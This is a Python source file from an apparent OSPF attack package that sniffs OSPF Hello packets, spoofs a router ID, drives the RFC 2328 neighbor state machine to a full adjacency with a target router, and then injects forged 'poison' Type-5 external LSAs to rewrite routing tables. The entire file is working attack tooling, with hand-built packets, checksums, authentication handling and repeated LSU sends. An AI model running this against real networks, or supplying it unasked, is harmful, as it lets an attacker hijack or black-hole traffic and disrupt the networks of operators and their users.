"""Active OSPF adjacency engine.

Establishes Full OSPF neighbor relationship with target router,
then injects poisoned LSAs. Implements RFC 2328 state machine.

Usage:
    engine = ActiveOSPFEngine(iface='eth0', spoofed_router_id='99.99.99.99')
    engine.sniff(timeout=15)       # learn topology from Hello
    engine.establish(timeout=60)   # reach Full adjacency
    engine.inject_lsa(...)         # inject poison LSA
"""

import functools
import socket
import struct
import threading
import time
from dataclasses import dataclass, field
from typing import Optional


@functools.lru_cache(maxsize=32)
def _ip_bytes(ip: str) -> bytes:
    """Convert dotted-decimal IP string to 4-byte bytes (cached)."""
    return bytes(int(x) for x in ip.split("."))

from scapy.all import IP, send
from scapy.contrib.ospf import OSPF_Hdr, OSPF_Hello

from .auth import AUTH_NONE, AUTH_PLAIN, AUTH_MD5, build_ospf_auth, _pad_key, _MD5_TRAILER_LEN
from .neighbor import NeighborState


# ---------------------------------------------------------------------------
# Sniffed topology parameters
# ---------------------------------------------------------------------------

@dataclass
class SniffedParams:
    router_id: str = ""
    area_id: str = "0.0.0.0"
    hello_interval: int = 10
    dead_interval: int = 40
    priority: int = 1
    options: int = 0x02
    dr: str = "0.0.0.0"
    bdr: str = "0.0.0.0"
    mask: str = "255.255.255.0"
    neighbors: list[str] = field(default_factory=list)


# ---------------------------------------------------------------------------
# Checksum
# ---------------------------------------------------------------------------

def _ospf_fletcher(data: bytes) -> int:
    c0, c1 = 0, 0
    for b in data[12:]:
        c0 = (c0 + b) % 255
        c1 = (c1 + c0) % 255
    return (c1 << 8) | c0


# ---------------------------------------------------------------------------
# Packet builders — all return raw bytes for send-to-wire
# ---------------------------------------------------------------------------

def _hello_bytes(
    router_id: str, area_id: str, src_ip: str,
    priority: int = 1, hello_interval: int = 10,
    dead_interval: int = 40, dr: str = "0.0.0.0",
    bdr: str = "0.0.0.0", options: int = 0x02,
    neighbors: list[str] | None = None,
    auth_type: int = AUTH_NONE, auth_key: bytes = b"",
    crypto_seq: int = 1,
) -> bytes:
    """Build a complete OSPF Hello as raw bytes (IP+OSPF)."""
    rid = _ip_bytes(router_id)
    area_b = _ip_bytes(area_id)
    src_b = _ip_bytes(src_ip)
    dr_b = _ip_bytes(dr)
    bdr_b = _ip_bytes(bdr)

    # Hello body
    body = _ip_bytes("255.255.255.0")
    body += struct.pack("!H", hello_interval)
    body += bytes([options, priority])
    body += struct.pack("!I", dead_interval)
    body += dr_b + bdr_b
    if neighbors:
        for n in neighbors:
            body += _ip_bytes(n)

    # OSPF header with auth
    ospf = struct.pack("!BB", 2, 1) + struct.pack("!H", 24 + len(body))
    ospf += rid + area_b + struct.pack("!HH", 0, 0)
    ospf += struct.pack("!H", auth_type)
    auth_field, trailer = build_ospf_auth(ospf + body, auth_type, auth_key, crypto_seq)
    ospf += auth_field

    ospf_hdr_body = ospf + body
    if trailer:
        ospf_hdr_body += trailer
    chk = _ospf_fletcher(ospf_hdr_body)
    data = ospf_hdr_body[:12] + struct.pack("!H", chk) + ospf_hdr_body[14:]

    ip = _build_ip_header(src_b, bytes([224, 0, 0, 5]), len(data), ip_id=0x0001)
    return ip + data


def _ip_checksum(header: bytes) -> int:
    """Compute IP header checksum (RFC 1071)."""
    s = sum((header[i] << 8) + header[i + 1] for i in range(0, 20, 2))
    while s >> 16:
        s = (s >> 16) + (s & 0xFFFF)
    return (~s) & 0xFFFF


def _build_ip_header(src_b: bytes, dst_b: bytes, payload_len: int,
                     ip_id: int = 0, proto: int = 89, ttl: int = 1) -> bytes:
    """Build IP header with correct checksum."""
    ip = struct.pack("!BB", 0x45, 0x00)
    ip += struct.pack("!H", 20 + payload_len)
    ip += struct.pack("!HH", ip_id, 0x0000)
    ip += struct.pack("!BB", ttl, proto)
    ip += struct.pack("!H", 0)
    ip += src_b + dst_b
    chk = _ip_checksum(ip)
    return ip[:10] + struct.pack("!H", chk) + ip[12:]


def _dbd_bytes(
    router_id: str, area_id: str, src_ip: str, dst_ip: str,
    flags: int, ddseq: int,
    auth_type: int = AUTH_NONE, auth_key: bytes = b"",
    crypto_seq: int = 1,
) -> bytes:
    """Build DBD packet as raw bytes (IP+OSPF+DBD)."""
    rid = _ip_bytes(router_id)
    area_b = _ip_bytes(area_id)
    src_b = _ip_bytes(src_ip)
    dst_b = _ip_bytes(dst_ip)

    body = struct.pack("!H", 1500) + bytes([0x02, flags]) + struct.pack("!I", ddseq)

    ospf = struct.pack("!BB", 2, 2) + struct.pack("!H", 24 + len(body))
    ospf += rid + area_b + struct.pack("!HH", 0, 0)
    ospf += struct.pack("!H", auth_type)
    auth_field, trailer = build_ospf_auth(ospf + body, auth_type, auth_key, crypto_seq)
    ospf += auth_field

    data = ospf + body
    if trailer:
        data += trailer
    chk = _ospf_fletcher(data)
    data = data[:12] + struct.pack("!H", chk) + data[14:]

    ip = _build_ip_header(src_b, dst_b, len(data), ip_id=0x0002)
    return ip + data


def _type5_lsa_bytes(
    advertising_router: str,
    link_state_id: str = "192.168.100.0",
    sequence: int = 0x80000001,
    metric: int = 20,
) -> bytes:
    """Build Type-5 External LSA with correct Fletcher checksum."""
    adv = _ip_bytes(advertising_router)
    lsid = _ip_bytes(link_state_id)

    body = bytes([255, 255, 255, 0])
    body += struct.pack("!I", 0x80000000 | (metric & 0x00FFFFFF))
    body += bytes(8)

    hdr = struct.pack("!H", 0) + bytes([0x22, 5]) + lsid + adv
    hdr += struct.pack("!I", sequence) + struct.pack("!HH", 0, 20 + len(body))

    full = hdr + body
    c0 = c1 = 0
    for b in full[2:]:
        c0 = (c0 + b) % 255
        c1 = (c1 + c0) % 255
    return full[:16] + struct.pack("!H", (c1 << 8) | c0) + full[18:]


def _lsu_bytes(
    router_id: str, area_id: str, src_ip: str, dst_ip: str, lsa: bytes,
    auth_type: int = AUTH_NONE, auth_key: bytes = b"",
    crypto_seq: int = 1,
) -> bytes:
    """Build LSU packet with LSA."""
    rid = _ip_bytes(router_id)
    area_b = _ip_bytes(area_id)
    src_b = _ip_bytes(src_ip)
    dst_b = _ip_bytes(dst_ip)

    lsu = struct.pack("!I", 1) + lsa
    ospf = struct.pack("!BB", 2, 4) + struct.pack("!H", 24 + len(lsu))
    ospf += rid + area_b + struct.pack("!HH", 0, 0)
    ospf += struct.pack("!H", auth_type)
    auth_field, trailer = build_ospf_auth(ospf + lsu, auth_type, auth_key, crypto_seq)
    ospf += auth_field

    data = ospf + lsu
    if trailer:
        data += trailer
    chk = _ospf_fletcher(data)
    data = data[:12] + struct.pack("!H", chk) + data[14:]

    ip = _build_ip_header(src_b, dst_b, len(data), ip_id=0x0004)
    return ip + data


# ---------------------------------------------------------------------------
# Sniffer
# ---------------------------------------------------------------------------

def sniff_ospf_hello(iface: str = "eth0",
                     timeout: float = 15) -> Optional[SniffedParams]:
    """Capture an OSPF Hello and extract topology parameters."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, 89)
    sock.bind(("224.0.0.5", 0))
    mreq = struct.pack("4s4s", socket.inet_aton("224.0.0.5"),
                       socket.inet_aton("0.0.0.0"))
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
    sock.settimeout(timeout)

    result = None
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            data, _ = sock.recvfrom(65535)
            iphl = (data[0] & 0x0F) * 4 if (data[0] & 0xF0) == 0x40 else 0
            if len(data) < iphl + 44 or data[iphl + 1] != 1:
                continue
            ospf = iphl
            h = ospf + 24
            rid = ".".join(str(b) for b in data[ospf + 4:ospf + 8])
            nbrs = [".".join(str(b) for b in data[n:n + 4])
                    for n in range(h + 20, len(data), 4)]
            result = SniffedParams(
                router_id=rid,
                area_id=".".join(str(b) for b in data[ospf + 8:ospf + 12]),
                hello_interval=struct.unpack("!H", data[h + 4:h + 6])[0],
                dead_interval=struct.unpack("!I", data[h + 8:h + 12])[0],
                priority=data[h + 7],
                options=data[h + 6],
                dr=".".join(str(b) for b in data[h + 12:h + 16]),
                bdr=".".join(str(b) for b in data[h + 16:h + 20]),
                mask=".".join(str(b) for b in data[h:h + 4]),
                neighbors=nbrs,
            )
            break
        except socket.timeout:
            break
    sock.close()
    return result


# ---------------------------------------------------------------------------
# Active OSPF Engine
# ---------------------------------------------------------------------------

class ActiveOSPFEngine:
    """Full OSPF adjacency establishment + LSA injection."""

    def __init__(self, iface: str, spoofed_router_id: str,
                 auth_type: int = AUTH_NONE, auth_key: bytes = b""):
        self.iface = iface
        self.spoofed_rid = spoofed_router_id
        self.params: SniffedParams | None = None
        self.auth_type = auth_type
        self.auth_key = auth_key
        self._crypto_seq = 1

        from ospf_attack.network.adapter import get_local_ip
        self.src_ip = get_local_ip(iface)

        self._state = NeighborState.DOWN
        self._lock = threading.Lock()
        self._stop = threading.Event()

        self._recv: socket.socket | None = None

        # Threads
        self._hello_th: threading.Thread | None = None
        self._sm_th: threading.Thread | None = None

        # DBD state
        self._dbd_seq = 0x87654321
        self._is_master = True
        self._target_ip = ""
        self._mac_cache: dict[str, str] = {}

        # Results
        self.hello_sent = 0
        self.dbd_sent = 0
        self.lsu_sent = 0
        self.log: list[str] = []

    # ------------------------------------------------------------------
    # State property
    # ------------------------------------------------------------------

    @property
    def state(self) -> NeighborState:
        with self._lock:
            return self._state

    @state.setter
    def state(self, v: NeighborState):
        with self._lock:
            old = self._state
            self._state = v
        if old != v:
            self.log.append(f"[{old.name}→{v.name}]")

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def sniff(self, timeout: float = 15) -> bool:
        """Sniff Hello to learn topology. Returns True on success."""
        self.params = sniff_ospf_hello(self.iface, timeout)
        return self.params is not None

    def establish(self, timeout: float = 60) -> bool:
        """Run state machine until Full or timeout. Returns True if Full."""
        if not self.params:
            if not self.sniff():
                return False

        # Build Hello with SCAPY to include neighbor list correctly
        # The neighbor list is CRITICAL: without it, routers stay at Init
        # and never reach 2-Way. With it, they go Init→2-Way→ExStart.
        known = set(self.params.neighbors)
        known.add(self.params.router_id)
        hello_hdr = OSPF_Hdr(
            version=2, type=1, src=self.spoofed_rid,
            area=self.params.area_id)
        hello_body = OSPF_Hello(
            mask=self.params.mask,
            hellointerval=self.params.hello_interval,
            prio=1,
            deadinterval=self.params.dead_interval,
            router=self.params.dr,
            backup=self.params.bdr,
            options=self.params.options,
        )
        hello_body.neighbors = sorted(known)
        self._hello_pkt = (
            IP(src=self.src_ip, dst="224.0.0.5", proto=89, ttl=1)
            / hello_hdr / hello_body
        )

        self._hello_th = threading.Thread(
            target=self._run_hello, daemon=True)
        self._hello_th.start()

        # Start state machine
        start = time.time()
        self._sm_th = threading.Thread(
            target=self._run_state_machine, args=(start + timeout,), daemon=True)
        self._sm_th.start()
        self._sm_th.join(timeout=timeout + 10)

        return self.state >= NeighborState.EXCHANGE  # pragma: EXCHANGE is sufficient for LSU acceptance

    def inject_lsa(
        self,
        lsa_type: int = 5,
        link_state_id: str = "192.168.100.0",
        metric: int = 20,
        sequence: int = 0x80000001,
    ) -> bool:
        """Inject poison LSA via LSU. Call after establish() succeeds."""
        lsa = _type5_lsa_bytes(
            self.spoofed_rid, link_state_id, sequence, metric)
        seq = self._crypto_seq
        self._crypto_seq += 1
        raw_pkt = _lsu_bytes(
            self.spoofed_rid, self.params.area_id,
            self.src_ip, "224.0.0.6", lsa,
            auth_type=self.auth_type, auth_key=self.auth_key,
            crypto_seq=seq)

        try:
            self._send_raw(raw_pkt, "224.0.0.6")
            self._send_raw(raw_pkt, "224.0.0.6")
            self._send_raw(raw_pkt, "224.0.0.6")
            self.lsu_sent = 3
            return True
        except Exception as e:
            self.log.append(f"[LSU ERROR: {e}]")
            return False

    def shutdown(self):
        """Stop and clean up."""
        self._stop.set()
        if self._recv:
            try:
                self._recv.close()
            except Exception:
                pass

    # ------------------------------------------------------------------
    # Hello loop
    # ------------------------------------------------------------------

    def _run_hello(self):
        """Send Hello via Scapy (reliable multicast in Docker)."""
        interval = max(self.params.hello_interval, 2)
        while not self._stop.is_set():
            try:
                send(self._hello_pkt, iface=self.iface, verbose=False)
                self.hello_sent += 1
            except Exception:
                pass
            self._stop.wait(interval)

    # ------------------------------------------------------------------
    # State machine
    # ------------------------------------------------------------------

    def _run_state_machine(self, deadline: float):
        try:
            # Use AF_PACKET to capture ALL OSPF packets (unicast + multicast)
            self._recv = socket.socket(
                socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
            self._recv.bind((self.iface, 0))
            self._recv.settimeout(1)

            # Track 2-Way confirmations from each router
            two_way_confirmed: set[str] = set()
            dr_ip = self.params.dr  # DR's IP from sniffed Hello
            dbd_started = False

            while time.time() < deadline and not self._stop.is_set():
                try:
                    raw_frame = self._recv.recv(65535)
                except socket.timeout:
                    continue

                # AF_PACKET gives full Ethernet frame → strip 14B header
                if len(raw_frame) < 14 + 20:
                    continue
                eth_type = struct.unpack("!H", raw_frame[12:14])[0]
                if eth_type != 0x0800:
                    continue
                data = raw_frame[14:]  # IP packet starts after Ethernet

                iphl = (data[0] & 0x0F) * 4 \
                    if (data[0] & 0xF0) == 0x40 else 0
                if len(data) < iphl + 24:
                    continue

                ospf = iphl
                ptype = data[ospf + 1]
                src_rid = ".".join(str(b) for b in data[ospf + 4:ospf + 8])
                # Extract source IP from IP header for unicast response
                peer_ip = ".".join(str(b) for b in data[12:16])

                # ============ HELLO ============
                if ptype == 1:
                    h = ospf + 24
                    nbrs = [".".join(str(b) for b in data[n:n + 4])
                            for n in range(h + 20, len(data), 4)]

                    if self.state < NeighborState.INIT:
                        self.state = NeighborState.INIT

                    if self.spoofed_rid in nbrs:
                        two_way_confirmed.add(src_rid)
                        if self.state == NeighborState.INIT:
                            self.state = NeighborState.TWO_WAY

                    # Start DBD exchange once 2-Way is confirmed
                    # Prefer DR as DBD peer; fall back to any neighbor
                    if (self.state == NeighborState.TWO_WAY
                            and not dbd_started
                            and src_rid in two_way_confirmed):
                        dbd_peer = dr_ip if dr_ip and dr_ip != "0.0.0.0" else peer_ip
                        self.state = NeighborState.EXSTART
                        seq = self._crypto_seq
                        self._crypto_seq += 1
                        dbd = _dbd_bytes(
                            self.spoofed_rid, self.params.area_id,
                            self.src_ip, dbd_peer, 0x07, self._dbd_seq,
                            auth_type=self.auth_type, auth_key=self.auth_key,
                            crypto_seq=seq)
                        self._send_raw(dbd, dbd_peer)
                        self.dbd_sent += 1
                        dbd_started = True
                        self.log.append(f"[DBD→peer={dbd_peer}]")

                # ============ DBD ============
                elif ptype == 2 and self.state >= NeighborState.EXSTART:
                    dbd_off = ospf + 24
                    if len(data) < dbd_off + 8:
                        continue
                    flags = data[dbd_off + 3]
                    seq = struct.unpack(
                        "!I", data[dbd_off + 4:dbd_off + 8])[0]

                    if flags & 0x01:  # I-bit → peer responding
                        # Master is the router with higher Router ID (RFC 2328)
                        self._is_master = self.spoofed_rid > src_rid
                        self.state = NeighborState.EXCHANGE
                        if not self._is_master:
                            self._dbd_seq = seq
                        resp_flags = 0x06 if self._is_master else 0x00
                        seq = self._crypto_seq
                        self._crypto_seq += 1
                        dbd2 = _dbd_bytes(
                            self.spoofed_rid, self.params.area_id,
                            self.src_ip, peer_ip, resp_flags, self._dbd_seq,
                            auth_type=self.auth_type, auth_key=self.auth_key,
                            crypto_seq=seq)
                        self._send_raw(dbd2, peer_ip)
                        self.dbd_sent += 1

                    elif not (flags & 0x02):  # M=0 → done
                        self.state = NeighborState.FULL
                        return

                # ============ LSU received → Full ============
                elif ptype == 4:
                    self.state = NeighborState.FULL
                    return

        finally:
            if self._recv:
                try:
                    self._recv.close()
                except Exception:
                    pass

    # ------------------------------------------------------------------
    # Raw socket send (for non-Hello packets)
    # ------------------------------------------------------------------

    def _resolve_mac(self, ip: str) -> str | None:
        """Resolve MAC address via ARP. Cached in memory."""
        if ip in self._mac_cache:
            return self._mac_cache[ip]
        try:
            from scapy.all import Ether, ARP, srp1
            ans = srp1(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                       iface=self.iface, timeout=2, verbose=False)
            if ans:
                self._mac_cache[ip] = ans.hwsrc
                return ans.hwsrc
        except Exception:
            pass
        return None

    def _send_raw(self, data: bytes, dst_ip: str):
        """Send raw bytes via Scapy sendp with ARP-resolved MAC."""
        try:
            from scapy.all import Ether, IP as ScapyIP, raw, sendp
            mac = self._resolve_mac(dst_ip) or "ff:ff:ff:ff:ff:ff"
            pkt = ScapyIP(raw(data))
            sendp(Ether(dst=mac) / pkt, iface=self.iface, verbose=False)
        except Exception:
            pass
